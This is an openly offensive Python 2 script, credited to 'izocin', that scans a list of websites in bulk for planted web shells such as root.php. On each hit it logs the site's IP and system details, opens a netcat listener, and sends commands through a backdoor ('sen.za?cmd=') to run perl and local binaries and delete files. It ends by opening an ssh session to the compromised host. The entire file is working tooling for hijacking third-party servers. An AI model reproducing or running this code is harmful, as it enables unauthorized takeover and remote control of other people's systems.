#!/usr/bin/python

# Coded By izocin 
# Turkey
import requests, re,socket,urllib, urllib2, os, sys, codecs,binascii, json, argparse					
from multiprocessing.dummy import Pool					     	
from time import time as timer	
import time
from random import sample as rand
from Queue import Queue				   		
from platform import system
from urlparse import urlparse
from optparse import OptionParser	
from colorama import Fore								
from colorama import Style								
from pprint import pprint								
from colorama import init												
init(autoreset=True)
										
															
####### Colors	 ######	
	
fr  =   Fore.RED											
fc  =   Fore.CYAN											
fw  =   Fore.WHITE											
fg  =   Fore.GREEN											
sd  =   Style.DIM											
sn  =   Style.NORMAL										
sb  =   Style.BRIGHT										

#######################
shells = ['/root.php','/media/root.php','/client/root.php','/wp-admin/user/root.php']
foundshells = []
zroot = ['?root']
zback = ['?back=cp']
zpyiz = ['?python']

try:
    dork = raw_input("[izocin] Site List name : ")
    with codecs.open(dork, mode='r', encoding='ascii', errors='ignore') as f:
        ooo = f.read().splitlines()
except IOError:
    pass
ooo = list((ooo))



def banners():


	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
		
		banner = """{}{} \n \n



		
                                                                
                                                                
                                                                
  ,--,                                      ,--,                
,--.'|          ,----,   ,---.            ,--.'|         ,---,  
|  |,         .'   .`|  '   ,'\           |  |,      ,-+-. /  | 
`--'_      .'   .'  .' /   /   |   ,---.  `--'_     ,--.'|'   | 
,' ,'|   ,---, '   ./ .   ; ,. :  /     \ ,' ,'|   |   |  ,"' | 
'  | |   ;   | .'  /  '   | |: : /    / ' '  | |   |   | /  | | 
|  | :   `---' /  ;--,'   | .; :.    ' /  |  | :   |   | |  | | 
'  : |__   /  /  / .`||   :    |'   ; :__ '  : |__ |   | |  |/  
|  | '.'|./__;     .'  \   \  / '   | '.'||  | '.'||   | |--'   
;  :    ;;   |  .'      `----'  |   :    :;  :    ;|   |/       
|  ,   / `---'                   \   \  / |  ,   / '---'        
 ---`-'                           `----'   ---`-'               
                                                                
     
 
 
	Coded By: izocin , https://selly.gg/@izocin
									
   
    

		\n""".format(fc, sb)
		
		print banner

			
	

def ExploitS(url):
	
	
    try:
		
		

		
		aCaaxcrevlib = requests.get(url+'?shell')
				
                if '2015 x86' in aCaaxcrevlib.text.encode('utf-8') or '2016 x86' in aCaaxcrevlib.text.encode('utf-8') or '2008 x86' in aCaaxcrevlib.text.encode('utf-8') or '2009 x86' in aCaaxcrevlib.text.encode('utf-8') or '2010 x86' in aCaaxcrevlib.text.encode('utf-8') or '2011 x86' in aCaaxcrevlib.text.encode('utf-8') or '2012 x86' in aCaaxcrevlib.text.encode('utf-8') or '2013 x86' in aCaaxcrevlib.text.encode('utf-8') or '2014 x86' in aCaaxcrevlib.text.encode('utf-8') or '2017 x86' in aCaaxcrevlib.text.encode('utf-8'):
		    print '[{}tARGET]: {} {}	       ====> {}{} Found     {}{} Success  '.format(sb, sd, url, fc,fc, sb,fg)
		    xshell_path = re.findall("uname(.*?)/uname",aCaaxcrevlib.content)
		    token = xshell_path[0]
		    Check = token.replace("[", "")
		    Check1 = Check.replace("]", "")
		    izo = url.replace('http://', '').replace('https://', '').replace('/', '').replace('root.php', '').replace('pci', '').replace('media', '').replace('tmp', '').replace('client', '')
		    ip = socket.gethostbyname(izo)
		    open('Vulns/rootedzfound.txt', 'a').write(url+'\n'+'siteip:'+ip+'\n'+Check1+'\n\n\n')
		    os.system("start /wait cmd /c nc -vlp 22")
		    xaCaaxcrevlib = requests.get(url+'?python')
		    maCaaxcrevlib = requests.get(url+'?root')
		    izom = url.replace('root.php', '')
		    
		    xnaCaaxcrevlib = requests.get(izom+'/prote/sen.za?cmd=perl c.pl')
		    nxnaCaaxcrevlib = requests.get(izom+'/prote/sen.za?cmd=rm -rf /tmp/izc')
		    ynaCaaxcrevlib = requests.get(izom+'/prote/sen.za?cmd=./izo izocans')
                    data = {"user": "izocin","host": ip}
                    #command = "ssh {user}@{host}"
                    #os.system(command.format(**data))
		    command = "start /wait cmd /c ssh {user}@{host}"
		    os.system(command.format(**data))
                                      
		    sys.exit()

		else:
			print '[{}Target]: {} {}	       ====> {}{} Exploit     {}{} Failed  '.format(sb, sd, url, fc,fc, sb,fr)

			
			
			
    except:
        pass
		


		
banners()

	
def Main():
    try:
		
        start = timer()
        ThreadPool = Pool(100)
        Threads = ThreadPool.map(ExploitS, ooo)
        print('Time: ' + str(timer() - start) + ' seconds')
    except:
        pass


if __name__ == '__main__':
    Main()

 
